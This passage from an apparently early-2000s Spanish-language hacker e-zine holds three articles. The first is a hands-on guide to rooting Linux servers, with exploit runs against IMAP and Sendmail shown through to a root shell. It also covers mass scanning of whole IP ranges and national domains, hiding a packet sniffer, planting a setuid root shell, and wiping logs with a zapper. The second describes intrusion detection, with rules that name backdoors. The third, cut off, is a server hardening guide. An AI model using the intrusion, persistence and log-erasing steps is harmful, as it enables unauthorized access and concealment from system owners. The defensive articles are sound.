casos si tiene ssh pero la  cuenta es /bin/false  osea  que  apenas  te  conectas el
servidor te vota, justamente por no tener una bash que ejecutar, casos extremos...

Muy bien, aun en estos casos extremos podemos rootear  la  maquina, a  traves de los
distintos servicios  que  esta  corriendo, puede ser FTP (proftpd)  SMTP (sendmail),
IMAP, por dar un ejemplo, etc.


5.1 - Explotando IMAPD
-=-=-=-=-=-=-=-=-=-=-=-

Veamos un ejemplo: La maquina corre  entre  sus servicios IMAP y nosotros tenemos la
susodicha cuenta que tal parece solo servirnos para FTP. Como ya sabemos necesitamos
algo de informacion para tener  nociones basicas, en este caso el daemon (IMAP) y su
version, ya con eso podemos  aplicar  nuestro exploit favorito acompa~ado de nuestra
cuenta. veamos:

# ./imapd_exploit 

Remote exploit for IMAP4rev1 v12.261, v12.264 and 2000.284
Developed by SkyLaZarT - www.BufferOverflow.org

./imapd_exploit <host> <login> <password> <type> [offset]
	type: [0]	Slackware 7.0 with IMAP4rev1 v12.261
	type: [1]	Slackware 7.1 with IMAP4rev1 v12.264
	type: [2]	RedHat 6.2 ZooT with IMAP4rev1 v12.264
	type: [3]	Slackware 7.0 with IMAP4rev1 2000.284


# ./imapd_exploit servidor.cl usuario contrase~a 2 0

Remote exploit for IMAP4rev1 v12.261, v12.264 and 2000.284
Developed by SkyLaZarT - www.BufferOverflow.org

Trying to exploit servidor.cl...
Using return address 0xbffff697. Shellcode size: 45 bytes

Connecting... OK
Trying to loging ... OK
Sending shellcode... OK
PRESS ENTER for exploit status!!


Exploit Success!!
uid=503(usuario) gid=231(popusers) groups=231(popusers)


Entramos al servidor como usuario normal con  sus  privilegios y derechos normales
dentro del systema, ya estando dentro lo demas es  relativamente facil, me refiero
a conseguir root  local, como  hemos  basado  nuestros  ejemplo en un rh62 podemos
correr un monton de exploits locales que hay  para esta distro. ejemplo:

# ./sxp 

...-=[ Sendmail 8.11.x exploit, (c)oded by sd@sf.cz [sd@ircnet], 2001 ]=-...
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

[*] Victim = /usr/sbin/sendmail
[*] Depth  = 32
[*] Offset = -16384
[*] Temp   = /tmp/.sxp
[*] ESP    = 0xbfffc248
[+] Created /tmp/.sxp
[+] Step 1. setuid() got = 0x080ad8d0
[*] Step 2. Copying /usr/sbin/sendmail to /tmp/.sxp/sm...OK
[*] Step 3. Disassembling /tmp/.sxp/sm...OK, found 3 targets
[*] Step 4. Exploiting 3 targets:
[1] (33% of targets) GOT=0x080ad8d0, VECT=0x00000064, offset=-16384
[2] (66% of targets) GOT=0x080ad8d0, VECT=0x080ca160, offset=-16384

Voila babe, entering rootshell!
Enjoy!
uid=0(root) gid=0(root) groups=508(prof)
#



06 - Tecnicas Varias
-=-=-=-=-=-=-=-=-=-=-

Con el tiempo uno va afinando su propia  tecnica y su propio estilo. Algunos optan
por explotar solo 1 tipo  de  vulnerabilidad  en  Servidores  Linux, otros  buscan
entrar por donde les sea mas sencillo, otro prueban y prueban... etc, veamos  como
explotar un solo tipo de vulnerabilidad, esto  basicamente  se logra con tener una
lista de ip´s, dentro de esa lista (texto plano) bamos buscando con un scaner el o
los tipos de vulneravilidades a  explotar, por ejemplo podemos buscar RPC y WU-FTP
o IMAP, BIND, como quieras, basta con contar con el scaner apropiado para hacer el
trabajo, ejemplo:

Queremos buscar servidores que esten corriendo portmapper (rpcbind):


6.1 - Obteniendo listas de ip´s
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

# ./pscan
Usage: ./pscan <b-block> <port> [c-block]

# ./pscan 192.168 111

El escaner comenzara a buscar  maquinas con el puerto 111 (rpcbind) abierto  desde
la direccion 192.168.0.0 hasta  la  192.168.255.255, y  nos  dejara  en un archivo
(statdx.log)  las  maquinas  que  cumplan con el requisito. Lo demas es como obvio
tomamos una ip y le pasamos el exploit, si explota bien sino seguimos con la otra,
y haci...

Nuevamente sale al vaile nmap, por que lo digo? por  que  nmap tambien puede hacer
el mismo trabajo, solo tenemos que decirle que busque  en  una subnet maquinas con
el port 111 open:

# nmap -sS -sR -P0 -O -p 111 192.168.x.x/32 > 111.log

En el archivo 111.log nos quedaran las posibles victimas.

Existe otra gran herramienta para esta utlidad, se llama scanutil, su funcionamiento
es bastante sencillo, le pasamos como argumento una lista de ips y  los  servicios y
su version ojo! a buscar, bastante interesante... veamos:

# ./scanutil -h

Usage: ./scanutil <file> <port> <string> [port] [string] ....

	  file    <----    file with the list of IPs to scan
	  port    <----    port for scan
	  string  <----    string to compare with what we receibe from the port
			    (if you dont want any string, type: null)

	Ex: ./scanutil ip.list 25 8.8.8 80 null 21 wu-2.4

# ./scanutil lista-de-ip 21 wu-2.4
200.73.8.48  <----- Port 21 + string found
200.73.8.7  <----- Port 21 + string found
200.9.100.1  <----- Port 21 + string found
216.241.1.10  <----- Port 21 + string found
......

Tambien les adjunto otro scan para sacar maquinas con wuftpd desde una lista. wu-scan
Lo mismo que los anteriores: de una lista de texto plano de ips busca maquinas con el
wuftpd guardadolo en un archivo de log.

# ./wu-scan

wu-scan by Narrow (nss@privacyx.com)

Usage: ./wuscan <IP List>


# ./wu-scan ips.log &

Pero yo les hablo de listas de ip y ustedes me diran ¿como consigo eso?. La verdad
es que es relativamente sencillo. Veamoslo con  un  ejemplo  algo  exagerado, pues 
obtendremos TODAS las ips de la zona .cl  Demas esta decir  que  nuestra  conexion
debe ser descente, hablo de algo superiror a unos 800 kbps, o  bien  tendremos que
reemplazar la conexion por algo de pasciencia, xD

Necesitaremos el programa z0ne, busquenlo en packetstorm, viene  ya  precompilado,
luego le damos permisos de ejecucion (chmod +x z0ne) y lo ejecutamos:

# ./z0ne

ADM	z0ne 1.1 - crazy-b

usage:	zone [-clo] [domain...]

# ./z0ne -o cl > chile.cl &


Con eso obtendras una larga lista de todas las ips del dominio .cl, el mismo ejemplo
es aplicable  a  zonas .com.ar, .co.za, etc, etc... Ahora basta con que le pasemos a 
esas listas  los distintos escanners de vulneravilidades que hemos visto y tendremos
posibles  intromisiones ;). Les  cuento que hoy hai muchos firewall y maquinas linux
que estan detectanto scaneos  de  este  tipo, los  mensages en el archivo de log que
dejan son tremendos, y alertan  a  cualquier  admin (que  revise  log´s) esta en sus 
manos correr el riesgo, aunque siempre hay formas, pueden usar  shells o simplemente
pueden no hacerlo, ha!...


6.2 - Sniffeando el Servidor
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

No pienso explicar a fondo que es sniffear o en que  consiste  tecnicamente (ya fue
explicado en la  Electron N°2 por s0ul) por que no es el objetivo de este articulo,
simplemente se~alar  que  cuando  sniffeamos  un  equipo podemos capturar todas las
conexiones que en la subnet se realicen, sesiones de SMTP, FTP, Telnet por ejemplo,
capturando porsupuesto logins y passwords. Con  esto  conseguimos cuentas reales de
usuarios y nos aseguramos la entrada futura a la maquina sin levantar sospechas. La
idea tambien  es  aprovecharse  de  esta situacion y aparte de sacar cuentas en esa
maquina tambien podemos capturar cuentas  de  maquinas  externas, usuarios  de  esa
LAN que se loggen a maquinas de afuera, y continuar con futuras intromisiones.

[Nota: Para quienes quieran profundizar en el tema del sniffing les  recomiendo  el
articulo escrito en  Electron N°2 por s0ul, donde se trata mas a fondo este tema. ]

Sniffear es relativamente sencillo, simplemente bajamos el sniffer  lo  compilamos,
le damos permisos de ejecucion (como root) y lo corremos. Usaremos  como ejemplo el
linsniffer del r00tkit lkr. Recomendaciones obvias como renombrar el sniffer a algo
menos llamativo como netcfg, syscfg, xsystem, etc y correrlo, o  bien  troyanear el
ps/top, para que el admin no se avispe con nuestro sniffer.

# mv linsniffer netcfg
# chmod +x netcfg
# ./netcfg &

Con ello el linsniffer nos dejara un archivo de log con todas las conexiones que a
capturado el archivo se llama TCP.log  y de una lectura bastante sencilla.

El problema  del  linsniffer  es que no es compatible por ejemplo con versiones mas
reciente  de rh7x, sea 7.0, 7.1, 7.2 y a muchos les da simplemente por no sniffear,
perdiendo la  oportunidad. Les doy el dato que para maquinas corriendo rh7x tenemos
al es un sniffer algo  engorroso  para  principiantes, no  es  llegar  y  correrlo, 
necesita de algunos parametros para sniffer correctamente, en cualquier caso  viene
acompa~ado por su respectiva documentacion, deja archivos con el nombre de la 
direccion ip sniffeada, de lectura tambien algo complicada, pero entendible.


6.3 - Manteniendonos en el sistema
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

Hay 101 formas para mantenernos en el sistema sin ser rastreados o  logeados, solo
dare ejemplos:

- Troyanenado el ps/top
- Usando cuentas reales de users
- * Teniendo su buen SUSHI (sed uid shell)
- Preocupandose de borrar siempre los logs
- Si usamos sinffer, renombrarlos o bien troyanearlos
- No conectandose en horas de trabajo
- Nunca killear procesos
- Usar backdoors (con password) << tema bastante visto
- Editando los bash_history
- No jugar con las tablas de routed si no sabes
- No jugar con las interfaces de red (eth0,1,2,X)
- No instalando programas sospechosos (BitchX, bouncers, etc)

En fin, son solo ejemplos y varian de un estilo a otro, pero pueden servir al iniciado.

* El sushi consiste en que cuando tenemos r00t en el sistema copiamos una shell, a un
directorio que nosotros usemos para tener nuestras tools, como /tmp/.tools/ le  damos
a esa shell  permisos  especiales (4755) para  que  cualquier  user pueda  ejecutarla 
manteniendo sus permisos y privilegios de la shell, en este caso r00t.   Ahora si nos
logeamos al sistema solo basta con ejecutar esta shell copiada  y  seremos  root, sin 
necesidad de explotar, esa es la idea.

# cp /bin/bash /tmp/.tools/shell
# chmod 4755 /tmp/.tools/shell

Logeamos como user normal:

# sh /tmp/.tools/shell
# id
bash# id
uid=12(user) gid=100(user) euid=0(root) groups=100(user)

Get r00tshell... ;)


6.4 - Borradando Nuestras Huellas
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Uno de los detalles mas importante al r00tear un sistema es sin duda borrar las
huellas que quedan de nuestro ingreso, en sistemas Linux  los archivos de logeo
quedan en /var/log/

Veamos un poco la estructura de los logs en linux: (segun /etc/syslog.conf)

/var/log/messages: Guarda un log de los usuarios que se conectaron, su ip, etc.

/var/log/secure: Guarda un registro de las ips y los demonios que se usaron.

/var/log/xferlog: Solo guarda logs de la conexiones FTP.

/var/log/utmp: Guarda un log de los usuarios que estan utilizando el sistema.

/var/log/wtmp: Guarda un log cada vez que un usuario entra al sistema o sale de el.

/var/log/lastlog: Guarda un log del momento en que un usuario entro por ultima vez.

/var/log/acct: Registra todos los comandos ejecutados por cada usuario

** No son todos los Logs pero si los mas importantes **

Seria interesante  estudiar a fondo el daemon encargado de todo el logeo en Linux.
Estoy hablando del syslog, hay montones de textos hay a  fuera, para  no  extender
demasiado esta perte no sera explicado, talves en otra ocacion.

Tenemos varias posibilidades para hacer el borrado perfecto, desde editar nosotros
mismos los archivos buscando nuestras conexiones  y  borrandolas, correr  un  buen
zapper, o borrar de raiz el archivo de log. Ojo con la ultima ocion  que  solo  se
debe ser usada como ultimo recurso, debido a que es muy sospecho  ver  el  archivo
log en 0 byte, incluso es mucho mas sospecho verlo haci que dejar nuestra conexion
logeada, creo que un punto discutible.

Como muchas veces el tiempo no es nuestro mejor aliado entonces debemos  correr  un
buen zapper, yo personalmente uso el scanutil hecho por Dr|3xe #0wn3d, es un zapper
bastante bueno, que busca tu ip en todo  el  server  y  luego  lo  limpia, quedamos
totalmente limpios, Sin huellas  ni  registros (ojo  con el .bash_history), debemos
correrlo obviamente como root:

# ./scanutil 

Uso:

 ./scanip.sh -s <IP/Host> </path> : Scanea tu ip en el server (log)
                                    * </path> = default /var
 ./scanip.sh -c <IP/Host> <user>  : Limpia tu ip *(Necesita antes
		                        haber usado la primera opcion)
 ./scanip.sh -x <IP/Host> <user>  : No necesita de ninguna opcion anterior
				            scanea y borra a la vez *(RECOMENDABLE)
 ./scanip.sh -clean               : limpia los registros de /tmp


# ./scanutil -x 192.168.1.1 user

Asumiendo que nos logeamos desde la ip: 192.168.1.1 y con el usuario: user


07 - Conclusiones
-=-=-=-=-=-=-=-=-=

Bien se~ores, hemos llegado  el  final  de este articulo, esperando  que le saquen 
utilidades siempre educativas y nunca con fines malisiosos o  lucrativos, no es la
idea del hack. Deben todos tener super claro  que  el  ingreso  no autorizado a un
servidor es penado, no crean que es llegar, entrar, hacer  un  defaced e irse, no!
mas equivocados no pueden estar, hay toda una gran polemica  en chile de trasfondo
respecto a este tema, mucho abogados quieren cambiar la actual ley informatica, de
nosotros depende  que  sea  una  ley  que  abogue  por  el  desarrollo  de  nuevas
tecnologias, software,  etc, y  no  de  sancionar  cuanto  acto  sea  cometido  en
Internet. Que sea  sancionado el sabotaje, el espionaje, el chantaje, el lucro con
db, en  chile  las  mismas empresas de seguridad estan cometiendo algunos de estos
actos y estan inpunes.

Por otro lado  un  buen administrador debe conocer bien a su "enemigo", siempre es
bueno conocer las dos  caras, en  este  caso  tambien  los  admin  pueden  sacarle
provecho al articulo, pienso mas adelante hacer algo  mas  grande  algo  asi  como
una guia, con  cosas  mucho  mas  tecnicas, incluyendo  temas como firewalls, ids,
modulos, etc, se aceptan colaboraciones, Saludos.

EleKtr0
Electron Security Team
http://www.est.cl/


[=========================([ Electron Security Team ])===========================]





[====([ filth ])===========================================================EST-4=]
[====([ Sistemas de Deteccion de Intrusos N.I.D.S. ])========================#08=]
[==========================================================([ filth@sunos.com ])=]

               

  Las herramientas de detecciones de  intrusos  son  aplicaciones automaticas, las 
cuales se encargan de  detectar intrusiones  en  tiempo real, dichos  sistemas les 
llaman "Network  Intruder Detection System"  NIDS. Bueno  el  punto  escencial  es 
obtener un  sistema seguro, ante  cualquier intromision  estos sistemas  entran en 
accion, no obstante  existen varios tipos de configuraciones para los NIDS.

     - Sistemas de Bases de Datos (BDS) con informacion actualizada de ataques
       soportados.

     - Compa¤ias con informacion de ataques conocidos

  A que me refiero con esto, quiere decir  que  el NIDS al igual que los Firewalls
necesitan una base de datos con ataques soportados. Ademas  esta  BDS necesita ser
actualizada periodicamente. Un ejemplo  seria  un  FireWall Phoenix  adaptable que 
soporta denegaciones de sevicios X y aparece una nueva vulnerabilidad  que proboca
una denegacion de servicios en ese tipo de  FireWalls y el admin no ah actualizado 
la BDS. Simplemente el FireWall cae al ataque. Lo mismo ocurre con los NIDS.

La base de datos  del NIDS necesita ser especificada ya que si existen dos ataques
similares pero no! iguales el ataque pasara sin ser detectado.

     - Sistemas Adaptables

  A mi parecer son los mejores NIDS que existen hasta el momento. Aparte de la BDS
con ataques  soportados, son  capaces  mediante Inteligencia  Artificial  aprender 
nuevos  tipos de  ataques a  detectar, ademas de  poseer  una  BDS de ataques. Sus 
principales  desventajas, son de costos  muy  elevados, dificiles  de  mantener  y 
necesitan de  un admin con conocimientos  avanzados  en estadisticas y matematicas 
(no son para mi...)

  Sin  embargo  los  NIDS  no  son  cosas de otro mundo si conocen los denominados 
Network Analyzer o Sniffers, los cuales son aplicaciones de  escucha  electronica. 
Los NIDS se basan similarmente  al  funcionamientos  de  los Sniffers, para  poder 
escuchar el trafico de la red.

  Los metodos a usar son reaccion y preventivo.

  - Reaccion   : Siempre visualiza logs en el sistema, cuando detecta una anomalia
                 "actua".

  - Prevencion : Siempre escanea  el  trafico  de  la  red  (Sniffer), si  detecta 
                 paquetes en transito anomalas "actua". 


  En  la  actualidad  los  NIDS  existentes  son muy vulnerables a denegaciones de 
servicios producidas por usuarios y no por fallas en los NIDS, es por  eso  que es 
dificil parchar ciertas vulnerabilidades en NIDS, muchos de  ellos  caen a ataques
spoofeados desde direcciones  distintas  con  ataques  similares, o cuando un NIDS 
ejecuta una shell para ejecutar  comandos al detectar un ataque puede saturarse el
sistema al llamar muchas shells.

  La insercion  de  los  NIDS depende bastante de la maquina que se este usando, a 
que me refiero con esto, que  si  instalo  un  NIDS  que  escanea  logs  en vez de 
paquetes en un tarro 486 simplemente es mucha tarea para un pobre  tarro, en  esas
circunstancias es mejor instalar un NIDS con deteccion  de  ataques en paquetes en
transito (Sniffer).

        Modos de los NIDS:

  Ciertamente el NIDS  al  igual  que un FireWall emplea modos "bajo, medio, alto,
paranoico" si  es  utilizado un modo  paranoico en un NIDS siempre que se ejecuten
comandos de root por otro  usuario  el  NIDS  va  a  lanzar  alertas  de  ataques, 
ciertamente es una decicion mas  del  admin del  NIDS  establecer  el  modo. Estas
herramientas existen para muchas plataformas:


	 Ejemplos y otros.

var INTERNAL 10.0.0.0/24
var EXTERNAL !10.0.0.0/24

preprocessor http_decode: 80 443 8080
preprocessor minfrag: 128

alert TCP $EXTERNAL any -> $INTERNAL 21 (msg: "IDS1/ADMw0rm-ftp-retrieval"; content: "USER w0rm|0D0A|"; flags: AP;)
alert TCP $EXTERNAL any -> $INTERNAL 1966 (msg: "IDS222/Backdoor-FakeFTP"; flags: S;)
alert TCP $EXTERNAL any -> $INTERNAL 1269 (msg: "IDS223/Backdoor-Matrix 1.x-2.0"; flags: S;)
alert ICMP 255.255.255.0/24 any -> $INTERNAL any (msg: "IDS202/backdoor-Q-icmp"; itype: 0; dsize: ">1";)
alert TCP 255.255.255.0/24 any -> $INTERNAL any (msg: "IDS203/backdoor-Q-tcp"; flags: A; dsize: ">1";)
alert TCP $INTERNAL 7161 -> $EXTERNAL any (msg:"IDS129/cisco-catalyst-remote-access"; flags: SA;)
alert TCP $EXTERNAL 80 -> $INTERNAL any (msg: "IDS215/client-netscape47-overflow-retrieved"; content: "|33 C9 B1 10 3F E9 06 51 3C FA 47 33 C0 50 F7 D0 50|"; flags: AP;)


	 Este es un tipico ejemplo de una base de datos con ataques 
soportados por los  NIDS. Un ejemplo un ataque seria el siguiente:

	 
	Atacante -----> > NIDS ----> > Host Victima 

  La idea es siempre poner un equipo con NIDS  antes del host victima, de la misma
forma con que se tratan  los firewalls. Tambien existen aplicaciones que testean a
los  NIDS  como  el NIDSBENCH  el cual se encarga de atacar equipos  NIDS mediante
algunas tools que este posee.

        TcpReplay :   Es  una  aplicacion  que ataca los  procesos background 
                      de  la  red  con  ataques  escondidos. Lo  que  proboca 
		          anomalias arbitrarias en TcpDump mediante  los ataques. 
		          TcpReplay escanea la velocidad de la red y la velocidad 
                      de respuesta de esta misma. 

	FragRouter  :   Se  encarga  de  atacar de la misma forma como si fuese 
		          un H4X0R 1337, en  otras  palabras  usa  ataques TCP/IP 
		          listados en la base  de  datos  de  ataques  a  evadir.
	
	IdsTest	:   Consiste  en   una  metodologia  de  chequeo  de  NIDS. 
		          Chequea   vulnerabilidades   expuestas   por  empresas, 
		          y  Vulnerabilities  Scanners,  ademas  chequea  ataques 
		          DOS, exploits, etc...
    
	 NIDS con NIDSBENCH (Dise~o):

	Atacante ----->        nisbench		-----> Nids -----> Victima
			(Fragrouter, TcoReplay)



        Sistemas soportados para usar NIDS 

        UNIX, LINUX, WINDOWS, etc.

  
Tambien  existen  Cluster  con NIDS, FireWalls con NIDS, Routers con NIDS. de la 
misma forma  estos sistemas tambien poseen sistemas R.A.I.D.


    Herramientas NIDS:

    Host Sentry  : http://psionic.com/abacus/host-sentry

    Shadow       : http://www.sans.org

    MOM          : http://www.biostat.wisc.edu/~annis/mom

    Hummer       : http://www.csds.uidaho.edu/~hummer

    AAFID        : http://www.cs.purdue.edu/coast/projects/aafid-announce.html

  
Espero   en  otra  ocacion  poder  explicarles  mas  sobre  el  funcionamiento  
de  los  NIDS tambien Espero  en  un  proximo texto explicar la instalacion de
estos en sistemas LINUX ya que en wintendo nunca los he usado. Ok hasta luego.


                                                               FILTH
                                                                
                                                               Net-X Security Team
                                                               filth@sunos.com
                                                               filth@post.com
                                                               netxst@sunos.com
                                                               netxst@post.com
                                                               http://n3tx.cjb.net


Pd.- Si  se  preguntan  por que no he weviado tanto en este articulo con chistes y 
weas. Es porque me aburri, eso nomas chao, y visiten la web, ah una cosa disculpen
la falta de acentos y ortografia  :)



[=========================([ Electron Security Team ])===========================]





[====([ bankzide ])========================================================EST-4=]
[====([ Una Mirada a La Seguridad ])=========================================#09=]
[==========================================================([ bankzide@est.cl ])=]


Aqui vamos de nuevo con un articulo, el primero de este tipo que escribo yo, y 
va a tratar sobre seguridad en servidores Linux. Esta no va hacer una completa 
guia sobre seguridad, pero explicara todos los  aspectos que se deben tener en 
cuenta  y que un  admin  deberia tener claro  en el momento de  administrar un 
servidor.

Muchos admins creen que por pasar de NT a Linux  la seguridad queda en segundo
plano, y no  se preocupan, ya que  creen que Linux es  un sistema seguro y que 
viene asi por lo que ya no tendran que preocuparse. Lo mas probable es que con
esa actitud, en menos de 5 dias alguna persona habra rooteado su sistema.

Muchas veces los  administradores no saben como  parchar sus Linux Box por que
no es tan simple como  bajar un simple patch en  la web de Microsoft, sino que
tiene mas complejidad y obviamente  aun no se han familiarizado con el asunto,
cosa muy frecuente ya que Linux se esta popularizando cada vez mas.

Asumo que se  tienen  ciertos  conocimientos en  el ambiente Unix. Todo lo que
veremos aqui esta orientado a distribuciones como  Slackware y Redhat, que son
las mas comunes en los web servers. Como minimo, tambien alguna de las ultimas
versiones del Kernel. Siempre  instalar la ultima  version estable de este, ya 
que cada nueva version viene con los bugs arreglados, updates, soporte, etc. 

Este  articulo  ayudara  especificamente a asegurar  un web server. Obviamente
aprovechando que ya  se tiene un servidor, se  le saca provecho  con todos los
services, pero aqui es donde viene el problema y hay  que ser  cuidadoso. Todo
es explotable, solo es cuestion de tiempo a que alguien ocupe algun service en
contra del server.
Por otro lado, tener  acceso  local al  server es mas  que un requisito. Tener
acceso remoto a la box, significa abrir servicios explotables, que seria mejor
tenerlos  cerrados, como lo son  FTP y Telnet. Si al server se puede  ingresar
remotamente, significa que alguien ciertamente tambien podria, no?


El Kernel
---------

Este es el corazon de un sistema *nix, en efecto es casi el  sistema completo.
Esta  definido  por  su version. La version  del kernel esta definida  por dos 
partes, la  kernel version (primer y segundo numero) y el patch  level (tercer
numero). Kernel  2.2.18 por ejemplo, el  2.2 es  la kernel version y  el 18 el 
patch level de ese Kernel especifico. Si el kernel version es  un numero impar
(ej. 2.3) seria  un development  kernel. Esa  no  es  una version estable y no 
deberia ser instalada, a menos que se sea un buen Geek de Unix. Las  versiones
de development, generalmente vienen con muchos bugs facilmente  explotables. A
menos que se sea un buen programador y conocedor de Unix, no se deberia correr
una version de development del Kernel. En www.freshmeat.net se puede encontrar
siempre el ultimo Kernel.


La Cuenta Root
--------------

Otro tema de seguridad que los admins miran es el uso de la cuenta root. Para
la mayoria del trabajo, la cuenta root no se necesita, y es algo importante a
destacar. Cuando se juega con la cuenta root, es como jugar con fuego. Usarla
es un riesgo  innesesario, especialmente  si se esta corriendo una  xterm. No 
solo se pueden  cometer errores usando la cuenta  root que pueden comprometer 
la  seguridad  del  servidor, tambien  hace que  sea mas dificil saber  quien
anduvo jugando como root, que seria un paso importante para saber kien rooteo
el sistema.
La manera mas facil de  evitar problemas con  la cuenta root  es hacerse otra 
cuenta (adduser) que  tenga permisos de admin. Esto dara muchos  privilegios,
pero no de root.


Cuentas Shell
-------------

Mucha gente  pide  cuentas  en  distintos  servidores, especialmente  si  son 
administrados por conocidos suyos, familiares, o lo que sea, para espacio web
o uso de ciertos servicios, etc. Eso  esta  bien, es lo  bonito de un sistema
*nix, permitir multiples  usuarios logearse  al sistema, pero lo  malo es que
esto tiene un lado oscuro. Si alguna de esas cuentas es crakeada, ese usuario
pierde toda privacidad con respecto a sus archivos y dejara  al intruso en un
muy buen punto  para rootear. Si  se dan shells, que  sean a las personas mas
confiables  y  que  estas  establezcan  contrase~as  que  no sean  facilmente
crakeables por fuerza bruta. Otra  solucion, seria agrupar las cuentas  en un
grupo con lo  que no tendran mucho  acceso al sistema para explotarlo. Hoy en 
dia, casi todos los servidores no tienen  habilitado el servicio telnet (23), 
por lo antes explicado. 


Los Servicios
-------------

Ahora veamos todos los servicios y daemons que dejan a un *nix corriendo bien.
Si el kernel es la base, el  esqueleto del sistema, entonces  los  servicios y
los daemons  serian  la  sangre, musculos, y  la piel. Son  los  que  ejecutan
operaciones, permitir usuarios externos, sustentan  la  web, etc. Son  tambien
los que permiten la entrada mas  facil  para  rootear  el sistema. Hay  muchos
servicios que son  importantes dependiendo del uso que se  da al sistema, como
seria hostear una web. Aqui el obligado seria el Hyper-Text Transfer Protocol,
mas conocido como http. Este es el  daemon que abre el puerto 80 en  el server
para  trafico HTTP, por  lo tanto  la lectura  de la web. Este  servicio no es
estandar en un sistema *nix, y viene con cualquier  web server que  se escoga.
HTTP es uno de los servicios mas seguros.

Otro daemon que seria necesario  como el HTTP seria Cron. Este mira todos los
programas  que estan  en  el cron tab (en otras palabras, los  programas  que 
siempre deberian estar corriendo), y si  uno  de esos  esta caido, inactivo o
congelado, comienza uno nuevo para asegurarse que el programa este corriendo.
Si el programa de inicializacion del web server esta en el cron tab, cada vez
que se caiga sera reestablecido dejando la web activa de nuevo.

Muchos servicios y  daemons son  innesesarios y muy inseguros. Estos deberian
ser killeados y si es posible, desabilitandolos de  que empiezen en el primer
lugar. Estos son los que hacen posibles los defacements e intrusiones.

-> finger

El mas innesesario y mas peligroso servicio  es el finger. El demonio  finger, 
corriendo en  el puerto 79, no  sirve  casi para  nada. El unico  proposito de 
este servicio es dar informacion sobre los usuarios. Tambien es  facil hacerlo
aer, usualmente a traves de un buffer overflow que daria un root access shell.
Aqui un ejemplo de un finger a un sistema *nix:


Login: root Name: Juan Perez A.
Directory: /admins/root Shell: /usr/local/bin/bash
Last login Sat Nov 29 17:03 (CST) on ttyC0
Mail last read Wed Dec 10 14:22 2000 (CST)
No Plan

	
Como ven, esto  ofrece  cierta  informacion que  podria ser usada por algun 
intruso. Da el tipo de shell usada (bash), directorio home, nombre real (en 
algunos casos), ultima  vez que se  logeo y la  ultima vez que el  mail fue 
leido. En otro  casos, se puede ver  aun mas informacion que tambien  puede
ser utilizada para ataques por brute. Este servicio deberia ser removido de 
los   archivos   de   startup. ( generalmente  /etc/inetd.conf  dejando  en 
comentario las lineas que lo comienzan. Otros archivos  que seria bueno ver
serian el /etc/rc.d donde podrian existir archivos  que manejan los startup
services, claro que esto es diferente con todos los Unix existentes.

-> FTP 

Otro servicio  que  es  facilmente  explotable  es  el  FTPd (File Transfer 
Protocol  Daemon). Este  permite a  usuarios que accedan a archivos  en  el
sistema , como tambien  mandar (subir) archivos  al mismo. El peligro  esta
mas que deducible. Ciertamente que este protocolo es uno de  los mas usados
y razonablemente seguro, siempre hay riesgos.
Dependiendo del  FTPd que el sistema corra, puede ser posible  para algunos 
casos  bajar  los  ficheros con  los  passwords y  otro  tipo  de  material 
interesante del sistema, que pueda brindar mas informacion de utilidad, por
lo tanto hay que mantener a los usuarios restringidos, por  ejemplo dejando 
sin  permisos de lectura a /etc o si la paranoia te invade, a  ningun  otro
dir que no sea del usuario. Una version de FTPd, WUftp, es el peor ftpd que
una Box pueda correr. Tiene tantos  bugs explotables que resulta  muy facil
la entrada al sistema. Es  tan facil, que hay gente que  escanea bloques de
IP  completos (ej. 192.23.*.*) en busca de  servidores  con este daemon. Es
recomendable tener siempre las ultimas versiones del  FTPd que se va a usar
y   obviamente  siempre   estar  al   tanto  de   los  ultimos   patches  y 
vulnerabilidades. En caso que este servicio no  se le diera uso, o  casi no
se ocupe, es recomendable killearlo.

-> Telnet

Otro  servicio  que no  se deberia  ocupar (siempre y cuando  el server sea 
administrado  fisicamente), es  el  telnetd. Este  permite  a los  usuarios 
acceder a una consola  remota en el  sistema. Si bien, este es un  servicio 
razonablemete seguro, trae  ciertos problemas. Basicamente, la unica  forma
de explotar el telnetd es por  ataques Brute  Force. Claro que este  ataque 
generalmente es  dificil, especialmente  si  el  administrador  del sistema
establece politicas  frente a la  asignacion de  passwords. Si se  tiene un 
buen password (ej. qweR00Tyuiop) seria muy dificil, por  no decir imposible
adivinarlo. Si el  sistema da solo  espacio webhost a los  usuarios, darles
acceso  a  telnet  es  muy  riesgoso e  innesesario, ya que  esto les da la 
facultad de correr exploits locales en el  sistema. Estos  muchas veces son
mas efectivos  que los  remotos, dada la  facilidad de  acceso al  sistema. 
Ahora, si los usuarios  quieren tener  servicios de shell en  el sistema, o
el admin necesita en  ocaciones  administarcion  remota, serian  las unicas
escusas para  dejar telnet (23)operando. Si  solo  se les da una cuenta por 
ftp a los usuarios del webhost, les recomiendo dejarlas en /bin/false.

-> SMTP

Si se estan dando e-mail services, hay  que  correr smtpd. Este  permite al
servidor enviar y  recibir  e-mail, como  tambien que personas  manden mail 
anonimos a traves  de el. Es seguro en la manera  de que no permite  acceso
inmediato al sistema e inseguro por el facil monitoreo de trafico in & out.
Para solucionar estos problemas basta  con siempre tener  la ultima patched
version  de SMTP o  ESMTP (Enhanced Simple  Mail  Transfer  Protocol). Como 
recomendacion, es preferible mandar  los mail  encriptados, ojala  con PGP, 
asi cualquier info que se mueva en los mails quedara aislada a intrusos.


Perl
----

Perl  scripts, si  no  estan  escritos  con  cuidado, pueden  tambien a los 
usuarios  ver  data. Como estos  corren en una  shell e interactuan  con el 
sistema, usualmente  pueden ser trickeados  para que muestren  informacion.
Tambien  si  a los  archivos que llama  o  se  refiere  no tienen  permisos 
stringent, cualquier persona podria ver  archivos jugando  directamente con
el script.


Logs
----

Los logs se podria decir que son los bytes mas importantes para un Sysadmin.
Con los logs, se puede saber quien  entro, desde que IP, a  que hora y otras
cosas  mas. Siempre logear  todas  las  coneciones  posibles, y para los mas
paranoicos, todo paquete que llegue al sistema. Un ejemplo de  logs seria el
intento fallido de  brute force  por telnet. Si se nota  que  una  cierta IP 
trato  de   logearse como  un  usuraio  muchas  veces  y  fallo, se  deberia 
restringir esa cuenta y bloquear esa IP. Los  logs usualmente se  encuentran
en /var/log/messages y deberian ser revisados periodicamente.


Passwords
---------

Algo muy importante  son  los  passwords, ya que si este  es el nombre de la 
persona, o en el peor de los casos, es igual al  nombre de usuario,  estamos
